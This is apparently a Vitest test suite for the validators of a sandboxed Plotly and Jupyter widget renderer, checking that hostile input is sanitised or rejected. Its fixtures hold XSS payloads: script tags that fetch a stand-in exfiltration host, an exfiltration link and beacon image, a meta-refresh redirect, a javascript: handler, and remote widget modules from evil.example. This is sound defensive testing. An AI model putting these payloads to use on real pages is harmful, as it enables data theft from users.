import { describe, expect, it } from "vitest";

import {
  INTERACTIVE_RENDERER_CHANNEL,
  isRenderRequestMessage,
  isRendererStatusMessage,
  validatePlotlySpec,
  validateWidgetPayload,
} from "./interactive-output";

describe("reviewed rendering regressions", () => {

  it("sanitizes HTML-bearing strings in trace data and layout", () => {
    const result = validatePlotlySpec({
      data: [{ type: "bar", y: [1], hovertemplate: '<script>fetch("https://exfiltrate.example")</script>' }],
      layout: { title: { text: '<a href="https://exfiltrate.example">click</a>' } },
    });
    expect(result.ok).toBe(true);
    if (!result.ok) {
      return;
    }
    const trace = result.value.data[0] as Record<string, unknown>;
    expect(trace.hovertemplate).not.toContain("<script>");
    expect(trace.hovertemplate).not.toContain("exfiltrate.example");
    const title = (result.value.layout as Record<string, unknown>).title as Record<string, unknown>;
    expect(title.text).not.toContain("exfiltrate.example");
    expect(title.text).toContain('href="#"');
  });

  it("strips a meta http-equiv=refresh redirect embedded in a saved widget's own string state", () => {
    const state = buildWidgetState("@jupyter-widgets/controls");
    (state.state["model-1"].state as Record<string, unknown>).value =
      '<meta http-equiv="refresh" content="0; url=https://exfiltrate.example"><p>hi</p>';

    const result = validateWidgetPayload({ model_id: "model-1" }, state);
    expect(result.ok).toBe(true);
    if (!result.ok) {
      return;
    }
    const sanitizedValue = result.value.state.state["model-1"].state.value as string;
    expect(sanitizedValue).not.toContain("http-equiv");
    expect(sanitizedValue).not.toContain("exfiltrate.example");
  });
});

function buildWidgetState(modelModule: string) {
  return {
    version_major: 2,
    version_minor: 0,
    state: {
      "model-1": {
        model_name: "IntSliderModel",
        model_module: modelModule,
        model_module_version: "2.0.0",
        state: { value: 1 },
      },
    },
  };
}

describe("validatePlotlySpec", () => {
  it("accepts a minimal valid spec", () => {
    const result = validatePlotlySpec({ data: [{ type: "bar", y: [1, 2, 3] }] });
    expect(result.ok).toBe(true);
  });

  it("rejects a non-object candidate", () => {
    const result = validatePlotlySpec("not an object");
    expect(result.ok).toBe(false);
    expect(!result.ok && result.reason).toBe("malformed");
    expect(!result.ok && typeof result.message).toBe("string");
  });

  it("rejects a spec missing a data array", () => {
    const result = validatePlotlySpec({ layout: {} });
    expect(result.ok).toBe(false);
    expect(!result.ok && result.reason).toBe("malformed");
  });

  it("rejects a spec with a non-object layout", () => {
    const result = validatePlotlySpec({ data: [], layout: "nope" });
    expect(result.ok).toBe(false);
  });

  it("rejects an oversized spec", () => {
    const hugeArray = new Array(200_000).fill("x".repeat(50));
    const result = validatePlotlySpec({ data: [{ type: "bar", y: hugeArray }] });
    expect(result.ok).toBe(false);
    expect(!result.ok && result.reason).toBe("oversized");
  });
});

describe("validateWidgetPayload", () => {
  it("accepts a standard controls widget referenced by the view", () => {
    const state = buildWidgetState("@jupyter-widgets/controls");
    const view = { version_major: 2, version_minor: 0, model_id: "model-1" };
    const result = validateWidgetPayload(view, state);
    expect(result.ok).toBe(true);
  });

  it("rejects state with an unsupported schema version", () => {
    const result = validateWidgetPayload(
      { model_id: "model-1" },
      { version_major: 1, version_minor: 0, state: {} },
    );
    expect(result.ok).toBe(false);
    expect(!result.ok && result.reason).toBe("malformed");
  });

  it("rejects a view missing model_id", () => {
    const state = buildWidgetState("@jupyter-widgets/controls");
    const result = validateWidgetPayload({}, state);
    expect(result.ok).toBe(false);
  });

  it("rejects a view referencing a model that is not in state", () => {
    const state = buildWidgetState("@jupyter-widgets/controls");
    const result = validateWidgetPayload({ model_id: "missing-model" }, state);
    expect(result.ok).toBe(false);
    expect(!result.ok && result.reason).toBe("malformed");
  });

  it("rejects a non-standard widget module explicitly", () => {
    const state = buildWidgetState("https://evil.example/widget.js");
    const view = { model_id: "model-1" };
    const result = validateWidgetPayload(view, state);
    expect(result.ok).toBe(false);
    expect(!result.ok && result.reason).toBe("unsupported-module");
  });

  it("rejects the @jupyter-widgets/output module explicitly", () => {
    const state = buildWidgetState("@jupyter-widgets/output");
    const view = { model_id: "model-1" };
    const result = validateWidgetPayload(view, state);
    expect(result.ok).toBe(false);
    expect(!result.ok && result.reason).toBe("unsupported-module");
  });

  it("rejects oversized widget state", () => {
    const state = buildWidgetState("@jupyter-widgets/controls");
    (state.state["model-1"].state as Record<string, unknown>).blob = "x".repeat(5_000_000);
    const result = validateWidgetPayload({ model_id: "model-1" }, state);
    expect(result.ok).toBe(false);
    expect(!result.ok && result.reason).toBe("oversized");
  });

  it("rejects a model whose inner state smuggles a hostile _view_module past the envelope check", () => {
    const state = buildWidgetState("@jupyter-widgets/controls");
    (state.state["model-1"].state as Record<string, unknown>)._view_module = "https://evil.example/widget.js";
    const result = validateWidgetPayload({ model_id: "model-1" }, state);
    expect(result.ok).toBe(false);
    expect(!result.ok && result.reason).toBe("unsupported-module");
  });

  it("rejects a model whose inner state smuggles a hostile _model_module past the envelope check", () => {
    const state = buildWidgetState("@jupyter-widgets/controls");
    (state.state["model-1"].state as Record<string, unknown>)._model_module = "https://evil.example/widget.js";
    const result = validateWidgetPayload({ model_id: "model-1" }, state);
    expect(result.ok).toBe(false);
    expect(!result.ok && result.reason).toBe("unsupported-module");
  });

  it("accepts a model whose inner state redundantly declares the same standard module", () => {
    const state = buildWidgetState("@jupyter-widgets/controls");
    (state.state["model-1"].state as Record<string, unknown>)._model_module = "@jupyter-widgets/controls";
    (state.state["model-1"].state as Record<string, unknown>)._view_module = "@jupyter-widgets/controls";
    const result = validateWidgetPayload({ model_id: "model-1" }, state);
    expect(result.ok).toBe(true);
  });

  it("rejects a model missing required fields", () => {
    const result = validateWidgetPayload(
      { model_id: "model-1" },
      { version_major: 2, version_minor: 0, state: { "model-1": { model_name: "X" } } },
    );
    expect(result.ok).toBe(false);
  });
});

describe("validatePlotlySpec trace/config hardening", () => {
  it("rejects mapbox/geo trace types that need network resources this sandbox blocks", () => {
    for (const type of ["scattermapbox", "choroplethmapbox", "densitymapbox", "scattergeo", "choropleth"]) {
      const result = validatePlotlySpec({ data: [{ type }] });
      expect(result.ok).toBe(false);
      expect(!result.ok && result.reason).toBe("unsupported-trace");
    }
  });

  it("allows ordinary offline trace types", () => {
    const result = validatePlotlySpec({ data: [{ type: "bar" }, { type: "scatter" }] });
    expect(result.ok).toBe(true);
  });

  it("drops disallowed config keys and forces safe values regardless of caller input", () => {
    const result = validatePlotlySpec({
      data: [],
      config: {
        responsive: true,
        showSendToCloud: true,
        showEditInChartStudio: true,
        plotlyServerURL: "https://exfiltrate.example",
        topojsonURL: "https://exfiltrate.example/topo",
        mapboxAccessToken: "leak-me",
        modeBarButtonsToAdd: [{ name: "evil" }],
        modeBarButtonsToRemove: ["zoomIn2d"],
        someUnknownKey: "should be dropped",
      },
    });

    expect(result.ok).toBe(true);
    if (!result.ok) {
      return;
    }
    expect(result.value.config).toMatchObject({
      responsive: true,
      showSendToCloud: false,
      showEditInChartStudio: false,
      plotlyServerURL: undefined,
      topojsonURL: undefined,
      mapboxAccessToken: undefined,
      modeBarButtonsToAdd: [],
      displaylogo: false,
    });
    expect(result.value.config?.someUnknownKey).toBeUndefined();
    expect(result.value.config?.modeBarButtonsToRemove).toEqual(
      expect.arrayContaining(["zoomIn2d", "toImage", "sendDataToCloud"]),
    );
  });
});

describe("validateWidgetPayload HTML value sanitization", () => {
  it("neutralizes an href/src/javascript: URI inside a saved widget's own string state", () => {
    const state = buildWidgetState("@jupyter-widgets/controls");
    (state.state["model-1"].state as Record<string, unknown>).value =
      '<a href="https://exfiltrate.example/?data=secret">click</a><img src="https://exfiltrate.example/beacon.png"><span onclick="javascript:evil()">x</span>';

    const result = validateWidgetPayload({ model_id: "model-1" }, state);
    expect(result.ok).toBe(true);
    if (!result.ok) {
      return;
    }
    const sanitizedValue = result.value.state.state["model-1"].state.value as string;
    expect(sanitizedValue).not.toContain("exfiltrate.example");
    expect(sanitizedValue).not.toContain("javascript:");
    expect(sanitizedValue).toContain('href="#"');
    expect(sanitizedValue).toContain('src=""');
  });

  it("strips script tags embedded in a saved widget's own string state", () => {
    const state = buildWidgetState("@jupyter-widgets/controls");
    (state.state["model-1"].state as Record<string, unknown>).value =
      '<p>hi</p><script>fetch("https://exfiltrate.example")</script>';

    const result = validateWidgetPayload({ model_id: "model-1" }, state);
    expect(result.ok).toBe(true);
    if (!result.ok) {
      return;
    }
    const sanitizedValue = result.value.state.state["model-1"].state.value as string;
    expect(sanitizedValue).not.toContain("<script>");
    expect(sanitizedValue).not.toContain("exfiltrate.example");
  });
});

describe("isRenderRequestMessage", () => {
  it("accepts a well-formed render-plotly request", () => {
    expect(
      isRenderRequestMessage({
        channel: INTERACTIVE_RENDERER_CHANNEL,
        type: "render-plotly",
        requestId: "abc",
        spec: { data: [] },
      }),
    ).toBe(true);
  });

  it("rejects messages on the wrong channel", () => {
    expect(
      isRenderRequestMessage({
        channel: "some-other-channel",
        type: "render-plotly",
        requestId: "abc",
        spec: { data: [] },
      }),
    ).toBe(false);
  });

  it("rejects an unknown message type", () => {
    expect(
      isRenderRequestMessage({
        channel: INTERACTIVE_RENDERER_CHANNEL,
        type: "eval",
        requestId: "abc",
      }),
    ).toBe(false);
  });

  it("rejects a request missing requestId", () => {
    expect(
      isRenderRequestMessage({
        channel: INTERACTIVE_RENDERER_CHANNEL,
        type: "render-plotly",
        spec: { data: [] },
      }),
    ).toBe(false);
  });

  it("rejects non-object candidates", () => {
    expect(isRenderRequestMessage(null)).toBe(false);
    expect(isRenderRequestMessage("hi")).toBe(false);
    expect(isRenderRequestMessage(42)).toBe(false);
  });
});

describe("isRendererStatusMessage", () => {
  it("accepts a renderer-ready message", () => {
    expect(isRendererStatusMessage({ channel: INTERACTIVE_RENDERER_CHANNEL, type: "renderer-ready" })).toBe(
      true,
    );
  });

  it("accepts a render-complete message with a numeric height", () => {
    expect(
      isRendererStatusMessage({
        channel: INTERACTIVE_RENDERER_CHANNEL,
        type: "render-complete",
        requestId: "abc",
        height: 120,
      }),
    ).toBe(true);
  });

  it("rejects a render-complete message with a non-numeric height", () => {
    expect(
      isRendererStatusMessage({
        channel: INTERACTIVE_RENDERER_CHANNEL,
        type: "render-complete",
        requestId: "abc",
        height: "tall",
      }),
    ).toBe(false);
  });

  it("rejects a message from a spoofed channel", () => {
    expect(
      isRendererStatusMessage({
        channel: "attacker-channel",
        type: "render-complete",
        requestId: "abc",
        height: 10,
      }),
    ).toBe(false);
  });
});
